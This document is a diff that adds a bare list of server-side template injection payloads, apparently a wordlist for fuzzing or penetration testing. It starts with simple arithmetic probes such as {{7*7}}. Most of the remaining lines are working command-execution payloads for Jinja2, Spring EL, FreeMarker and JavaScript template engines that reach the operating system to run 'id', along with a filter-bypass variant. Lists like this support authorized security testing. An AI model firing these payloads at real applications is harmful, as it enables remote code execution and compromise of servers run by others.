@@ -1,0 +1,23 @@
+{{7*7}}
+{{7*'7'}}
+${{7*7}}
+${7*7}
+<%= 7*7 %>
+<%= 7*7.'class' %>
+#{7*7}
+{7*7}
+{{config}}
+{{self}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+{{= 7*7}}
+{{constructor.constructor('return 7*7')()}}
+${__import__('os').system('id')}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+${{#import os}}{os.system('id')}
+{{lipsum.__globals__['os'].popen('id').read()}}
+#{T(java.lang.Runtime).getRuntime().exec("id")}
+{{ ''|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}
+${/\u0047etRuntime/}
